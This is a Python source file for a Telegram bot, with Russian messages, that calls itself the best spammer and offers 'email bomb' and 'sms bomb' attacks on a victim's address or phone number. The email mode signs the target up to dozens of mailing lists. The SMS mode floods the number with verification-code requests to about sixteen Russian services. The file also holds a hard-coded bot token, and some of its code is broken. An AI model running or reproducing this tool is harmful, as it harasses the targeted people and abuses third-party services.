from aiogram import Bot, Dispatcher, executor
from aiogram.types import Message, ReplyKeyboardRemove, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import asyncio
import re
import requests
import datetime
import random
import math


BOT_TOKEN = '1281711461:AAGtcXl07fGp77rC9ToU87NVAYYl_cEs4Ww'
loop = asyncio.get_event_loop()


# данные
attack_mail   = ""
attack_number = ""

heads = [{'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
           'Accept': '*/*'},
           {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
           'Accept': '*/*'},
           {"User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
           'Accept': '*/*'},
           {'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
           'Accept': '*/*'},
           {"User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
           'Accept': '*/*'},
]
# инициализируем бота
bot = Bot(BOT_TOKEN, parse_mode = "HTML")
dp = Dispatcher(bot, loop = loop)

button_email = KeyboardButton('email bomb')
button_sms   = KeyboardButton('sms bomb')
greet_kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
greet_kb.add(button_email, button_sms)
  
  
async def mail_attack(attack_mail, amount_msg, message):
    spam_id = attack_mail
    count = amount_msg
    start = datetime.datetime.now()
    urllist=["http://list.webaim.org/mailman/subscribe/webaim-forum?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://lists.drupal.org/mailman/subscribe/security-internals?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://lists.drupal.org/mailman/subscribe/security-news?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://coral.aoml.noaa.gov/mailman/subscribe/cdhc?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&email-button=Subscribe","http://coral.aoml.noaa.gov/mailman/subscribe/coral-list?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&email-button=Subscribe","http://audifans.com/mailman/subscribe/es2?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/offtopic?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/marketplace?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/events?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/staff?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/tt?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/torsen?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/tjs?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://audifans.com/mailman/subscribe/vwdiesel?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/v6-12v?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/v8?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/urq?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/av-games?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/sundaynightgames?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/tjs-web?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://list.healthnet.org/mailman/subscribe/india-drug?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-stacey?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/springsource-announce?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/vmwaretest?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/security-announce?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/solutionproviderroundtable?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://list.healthnet.org/mailman/subscribe/pronut-hiv?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://audifans.com/mailman/subscribe/quattro?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/jugglefest-announce?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://place.org/cgi-bin/mailman/subscribe/aow?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-contributors?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-contributors?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/te-webmaster?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe","http://lists.vmware.com/mailman/subscribe/fusion-enterprise?email="+spam_id+"&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe"]

    amount = count // 34
    for i in range(amount):
        for var in range(34):
            try:
                url=urllist[var]
                requests.get(url)
            except:
                pass
    
    end_time = datetime.datetime.now() - start
    text = f"отправлено {amount_msg} писем за {end_time}"
    await message.reply(text = text)

async def sms_attack(input_number, sms, message):
    if sms < 1:
        text = "вы не выбрали количество сообщений"
        await message.reply(text = text)
        return 0
        
    def check(sent, sms):
        if sent == sms:
            return 0
            quit()
    
    number_7 = input_number
    number_plus7 = "+" + input_number 
    number_8 = str(8) + input_number[1:]
    sent = 0
    HEADERS = random.choice(heads)
    start = datetime.datetime.now()
    
    for i in range(math.ceil(sms/17)):
    	try:
    		await requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7}, headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		await requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": number_7}, headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		await requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": number_plus7, "api": 2, "email": "email","x-email": "x-email"}, headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		await requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': number_plus7}, headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		await requests.post('https://b.utair.ru/api/v1/login/', data = {'login':number_8}, headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		await requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":number_7}, headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		await requests.post('https://www.citilink.ru/registration/confirm/phone/+'+ number_7 +'/', headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		await requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number_plus7}, headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		await requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":number_7}, headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		await requests.post('https://youdrive.today/login/web/phone', data = {'phone': number, 'phone_code': '7'}, headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		await requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		await requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":number_plus7}, headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		await requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + number_7}, headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		await requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": number_7}, headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		await requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": number_7, "SignupForm[device_type]": 3}, headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		await requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': number_7, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
    		sent += 1
    		check(sent,sms)
    	except:
    		pass
    
    end_time = datetime.datetime.now() - start
    text = f"Отправлено {sms} сообщений за {end_time}"
    await message.reply(text = text)


@dp.message_handler(commands=['start'])
async def process_start_command(message: Message):
    await message.reply(f"Привет, {message.from_user.first_name}! Это лучший спамер за последние 1000 лет!", reply_markup = greet_kb)

@dp.message_handler()
async def echo(message: Message):
	global amount_msg
	patt = r"([\w\.-]+)@([\w\.-]+)(\.[\w\.]+)"
	equ_email = re.search(patt, message.text)
	
	try:
		if int(message.text) < 999999999:
			amount_msg = int(message.text)
			text = f"Уже достаточно ахуенно, количество сообщений изменено на <b>{message.text}</b>."
			await message.answer(text = text, parse_mode = "HTML")
	except:
		pass
	
	if message.chat.type == 'private':
		if message.text == "email bomb":
			text = f"выбран режим <b>email спама</b>. Пожалуйста, введите количество сообщений, минимум 34, а потом адрес почты жертвы"
			await message.answer(text = text, parse_mode = "HTML")
		elif message.text == 'sms bomb':
			text = f"выбран режим <b> sms сама</b>. Пожалуйста, введите количество сообщений минимум 17, а потом номер жертвы в формате 79999999999"
			await message.answer(text = text, parse_mode = "HTML")

			
	if message.text[:2] == "79" and len(message.text) == 11:
		attack_number = message.text
		text = f"Потрясно, номер телефона изменён на <b>{message.text}</b>. Атака запущена"
		await message.answer(text = text, parse_mode = "HTML")
		await sms_attack(attack_number, amount_msg, message)
	
	if equ_email:
		attack_mail = equ_email.group()
		text = f"Чотко, номер почты изменён на <b>{attack_mail}</b>. Атака запущена"
		await message.answer(text = text, parse_mode = "HTML")
		await mail_attack(attack_mail, amount_msg, message)
	

# запускаем лонг поллинг
if __name__ == '__main__':
	executor.start_polling(dp)
